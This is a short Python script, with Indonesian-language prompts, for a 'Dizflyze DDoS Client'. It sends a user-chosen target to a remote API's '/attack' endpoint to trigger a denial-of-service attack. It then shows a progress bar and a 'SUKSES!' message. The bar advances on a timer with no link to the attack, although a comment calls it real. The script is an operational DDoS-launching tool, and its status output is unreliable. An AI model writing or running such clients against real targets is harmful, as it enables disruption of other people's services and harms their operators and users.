import requests
from rich.console import Console
from rich.progress import Progress
from rich.panel import Panel

console = Console()

def main():
    console.print(Panel.fit("[bold cyan]Dizflyze DDoS Client[/]\n[bold yellow]Ctrl+C utk berhenti", 
                         style="bold blue"))
    
    api_url = console.input("[bold white]Masukin URL API: ")
    target = console.input("[bold white]Target: ")
    
    with Progress() as progress:
        task = progress.add_task("[cyan]Nembak...", total=100)
        
        try:
            res = requests.post(
                f"{api_url}/attack",
                json={"target": target},
                timeout=10
            )
            
            if res.status_code == 200:
                attack_id = res.json()['attackId']
                
                while not progress.finished:
                    progress.update(task, advance=1.5)
                    # Real attack, bukan fake progress
                    if progress.tasks[0].completed >= 100:
                        progress.stop()
                        console.print(Panel.fit(
                            f"[green]SUKSES![/] {target}",
                            title="[bold green]STATUS",
                            border_style="green"
                        ))
                        break
            else:
                console.print("[red]GAGAL! Server error")
                
        except Exception as e:
            console.print(f"[red]ERROR: {str(e)}")

if __name__ == "__main__":
    main()
